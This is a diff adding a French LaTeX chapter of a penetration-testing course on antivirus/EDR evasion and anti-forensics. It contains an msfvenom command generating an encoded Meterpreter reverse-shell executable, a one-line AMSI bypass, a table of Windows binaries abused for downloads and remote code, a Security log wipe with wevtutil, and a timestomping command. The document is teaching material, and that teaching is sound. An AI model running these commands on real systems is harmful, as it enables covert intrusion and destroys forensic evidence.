@@ -1,0 +1,121 @@
+% ==============================================================================
+% Fichier : 07_evasion_antiforensic.tex
+% Description : Évasion des Défenses et Anti-Forensics
+% ==============================================================================
+
+\chapter{Évasion des Défenses et Anti-Forensics}
+
+Les outils d'attaque standards (comme Metasploit ou Mimikatz) sont connus de tous les éditeurs d'antivirus (AV) et des systèmes de détection (EDR). Pour réussir un Pentest avancé, il est impératif de savoir rendre ses outils indétectables et de nettoyer ses traces.
+
+\section{Évasion des Antivirus et EDR}
+% ------------------------------------------------------------------------------
+
+L'objectif est d'exécuter du code malveillant sans être bloqué ou signalé.
+
+\subsection{Principes de Détection}
+
+Les défenses utilisent principalement deux méthodes :
+\begin{itemize}
+    \item \textbf{Détection Statique (Signature) :} Analyse le fichier pour rechercher des séquences d'octets connues (signatures).
+    \item \textbf{Détection Comportementale (Heuristique) :} Analyse le comportement du programme lors de l'exécution (ex: tentative de dump de la mémoire LSASS).
+\end{itemize}
+
+\subsection{Techniques d'Obfuscation}
+
+Pour contourner la détection statique, il faut modifier le code sans changer sa fonction.
+
+\begin{itemize}
+    \item \textbf{Encodage :} Utiliser des encodages simples (Base64, XOR, Shikata Ga Nai).
+    \item \textbf{Packing :} Compresser et chiffrer l'exécutable. Le fichier infecté a une signature différente à chaque "pack".
+    \item \textbf{Custom Payloads :} Écrire son propre code (C, C#, Python compilé) au lieu d'utiliser des payloads publics.
+\end{itemize}
+
+\begin{lstlisting}[language=bash, caption=Génération de payload indétectable avec Msfvenom]
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > backdoor.exe
+# -e : encodeur
+# -i : nombre d'iterations (plus c'est haut, plus c'est dur a analyser)
+\end{lstlisting}
+
+\subsection{Living Off The Land (LotL)}
+
+Technique visant à utiliser les outils légitimes présents par défaut dans le système d'exploitation pour réaliser l'attaque. Comme ces outils sont signés par Microsoft, ils sont souvent "autorisés" par l'antivirus.
+
+\begin{table}[h!]
+\centering
+\small
+\begin{tabular}{p{3cm}p{5cm}p{4cm}}
+    \toprule
+    \textbf{Outil (LoLBin)} & \textbf{Usage Légitime} & \textbf{Usage Malveillant} \\
+    \midrule
+    \textbf{Certutil} & Gestion certificats. & Téléchargement de fichiers (remplace wget/curl). \\
+    \textbf{Mshta} & Exécution d'applications HTML. & Exécution de scripts malveillants (HTA) sans fichier EXE. \\
+    \textbf{Regsvr32} & Enregistrement DLL. & Exécution de code distant via scriptlets. \\
+    \textbf{Powershell} & Administration. & Exécution de payloads en mémoire (Fileless). \\
+    \bottomrule
+\end{tabular}
+\caption{Exemples de Living Off The Land Binaries}
+\end{table}
+
+\begin{boxlizbiz}
+\textbf{Cas LiZbiZ :}
+Au lieu de déposer un fichier \texttt{mimikatz.exe} sur le disque (qui serait détecté), l'attaquant utilise un script PowerShell qui charge Mimikatz directement depuis la mémoire vive (Reflective Injection), sans jamais écrire de fichier sur le disque dur.
+\end{boxlizbiz}
+
+\subsection{Bypass AMSI (Antimalware Scan Interface)}
+
+AMSI est une interface Windows qui permet à l'antivirus de scanner le contenu des scripts (PowerShell, VBScript) avant exécution. Le contourner est souvent nécessaire pour utiliser PowerShell.
+
+\begin{lstlisting}[language=PowerShell, caption=Exemple de bypass AMSI simple]
+# Desactive la protection AMSI pour la session en cours
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+\end{lstlisting}
+
+% ------------------------------------------------------------------------------
+\section{Anti-Forensics : Effacer ses Traces}
+% ------------------------------------------------------------------------------
+
+Une fois l'objectif atteint (démonstration de l'impact), le pentester doit nettoyer l'environnement pour restaurer son état initial et ne pas laisser de portes ouvertes (Backdoors), sauf si le mandat le prévoit.
+
+\subsection{Nettoyage des Logs (Event Logs)}
+
+Windows journalise toutes les actions dans l'Observateur d'événements.
+
+\begin{itemize}
+    \item \textbf{Logs de Sécurité :} Connexions, créations de comptes, accès aux objets.
+    \item \textbf{Logs Système :} Installation de services, démarrage/arrêt.
+\end{itemize}
+
+\begin{lstlisting}[language=bash, caption=Effacement des logs avec wevtutil]
+# Effacer le journal de securite (Action tres bruyante en soit)
+wevtutil cl Security
+\end{lstlisting}
+
+\begin{boxalert}
+\textbf{Attention Opérationnelle :} Effacer les logs est une preuve de culpabilité évidente en cas d'incident réel. En Pentest, cette action doit être réalisée avec parcimonie ou simulée (indiquer dans le rapport : "Nous aurions pu effacer les logs").
+\end{boxalert}
+
+\subsection{Timestomping}
+
+Technique consistant à modifier les métadonnées temporelles d'un fichier pour qu'il semble avoir été créé ou modifié bien avant l'attaque, perturbant l'analyse forensique.
+
+\begin{lstlisting}[language=bash, caption=Timestomping sous Linux]
+touch -t 202201010000 backdoor.sh
+# Change la date du fichier au 01/01/2022 minuit
+\end{lstlisting}
+
+\subsection{Suppression des Artefacts d'Exécution}
+
+\begin{itemize}
+    \item Supprimer les fichiers temporaires (\texttt{\%TEMP\%}).
+    \item Vider l'historique PowerShell (\texttt{Clear-History}).
+    \item Supprimer les entrées de Registre créées pour la persistance.
+    \item Restaurer la configuration du pare-feu.
+\end{itemize}
+
+% ------------------------------------------------------------------------------
+\section{Attaques "Fileless" (Sans Fichier)}
+% ------------------------------------------------------------------------------
+
+Technique ultime d'évasion. Le code malveillant ne réside que dans la mémoire RAM (ou le Registre). Au redémarrage de la machine, l'infection disparaît. Très difficile à détecter par les scans de disque.
+
+\textbf{Exemple :} Un script PowerShell injecté directement en mémoire via une vulnérabilité web, qui tente de se connecter au contrôleur de domaine.
